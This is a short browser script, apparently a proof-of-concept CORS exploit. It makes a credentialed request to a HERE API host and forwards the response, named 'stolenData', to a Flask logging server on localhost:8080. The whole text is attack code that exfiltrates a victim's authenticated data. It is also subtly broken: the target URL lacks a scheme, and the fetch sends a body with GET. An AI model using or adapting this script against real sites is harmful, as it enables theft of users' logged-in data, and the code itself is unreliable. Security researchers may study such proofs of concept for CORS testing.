<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;  
    req.onerror = function() {
        console.error('Request failed');
    };
    req.open('GET', 'browse.search.hereapi.com', true);  
    req.withCredentials = true;  
    req.send();  

    function reqListener() {
        var response = encodeURIComponent(this.responseText);
        
        // Send the response to your Flask server
        fetch('http://localhost:8080/log', {
            method: 'GET',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({ stolenData: response })
        })
        .then(res => res.json())
        .then(data => console.log(data))
        .catch(err => console.error('Error sending data:', err));
    }
</script>
